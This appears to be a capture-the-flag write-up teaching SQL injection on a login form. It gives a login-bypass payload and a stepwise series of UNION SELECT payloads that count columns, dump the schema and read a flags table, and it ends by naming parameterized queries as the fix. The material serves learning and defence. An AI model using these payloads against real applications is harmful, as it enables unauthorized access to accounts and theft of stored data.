$ 0x01 — The login form

The challenge gives you a classic username/password form. First rule of web CTFs: find out what the backend query looks like. A login usually builds something like:

SELECT * FROM users WHERE username='<input>' AND password='<input>';

Probe with a single quote in the username field. If the page errors or behaves differently — the input reaches SQL. Then bypass the password check entirely:

username: admin' OR 1=1--
password: anything

The query becomes ... WHERE username='admin' OR 1=1--' AND ... — everything after -- is a comment, 1=1 is always true, and you are logged in as admin.

$ 0x02 — Going deeper with UNION

Login bypass is step one. To actually read data, find a page that reflects query output (a profile page, search results), then:

steppayload ideagoal
1' ORDER BY 1-- … increment until errorcount columns
2' UNION SELECT 1,2,3--find reflected columns
3' UNION SELECT sql,2,3 FROM sqlite_master--dump schema
4' UNION SELECT flag,2,3 FROM flags--read the flag

$ 0x03 — Takeaways

  • Error messages are oracle output. Different responses for valid vs broken SQL tell you the query shape.
  • UNION needs matching column counts — that is what the ORDER BY probing is for.
  • The real-world fix: parameterized queries / prepared statements. String-concatenated SQL is the vulnerability, the payload is just the messenger.
